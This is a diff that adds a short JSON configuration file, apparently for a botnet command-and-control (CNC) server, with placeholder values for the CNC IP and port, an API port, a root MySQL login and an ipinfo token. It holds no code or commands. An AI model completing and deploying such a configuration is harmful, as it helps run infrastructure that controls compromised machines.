@@ -1,0 +1,12 @@
+{
+    "cnc_ip": "Urip",
+    "cnc_port": "12121",
+    "api_port": "9999",
+    "database_ip": "127.0.0.1:3306",
+    "database_name": "Morte",
+    "database_user": "root",
+    "database_password": "Ursqlpass",
+    "ipinfo_token": "Uripinfo apikey",
+    "gobal_slot": 1,
+    "version": "3.4.0"
+}
